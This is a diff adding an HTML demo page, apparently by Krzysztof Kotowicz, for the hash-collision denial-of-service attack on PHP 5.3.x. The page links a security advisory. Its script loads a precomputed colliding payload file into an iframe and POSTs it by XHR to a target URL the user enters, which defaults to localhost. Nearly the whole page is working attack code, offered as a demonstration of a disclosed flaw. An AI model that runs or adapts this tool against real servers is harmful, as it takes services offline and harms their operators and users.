@@ -1,0 +1,32 @@
+
+<h1>Hash collisions in POST Denial-of-service exploit demo</h1>
+<p>by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a> (<a href="//twitter.com/kkotowicz">@kkotowicz</a>)
+
+<p>More info: <a href="http://www.nruns.com/_downloads/advisory28122011.pdf">Denial of Service through hash table multi-collisions advisory</a>
+<p>The following POST content should DoS PHP 5.3.x for a minute or so</p>
+<h2>Post of Doom:<h2>
+<iframe id=killer></iframe>
+<br />
+<input size="80" id=url value="http://localhost">
+<button disabled=disabled id=start onclick=start()>start</button>
+<script>
+document.getElementById('killer').onload = function() {
+    document.getElementById('start').disabled = '';
+}
+
+var start = function() {
+    document.getElementById('start').disabled = 'disabled';
+    var post = document.getElementById('killer').contentWindow.document.body.innerText;
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", document.getElementById('url').value, true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.setRequestHeader('Content-Length', post.length);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            alert(xhr.responseText);
+        }
+    }
+    xhr.send(post);
+};
+document.getElementById('killer').src="killer.txt?" + Math.random();
+</script>
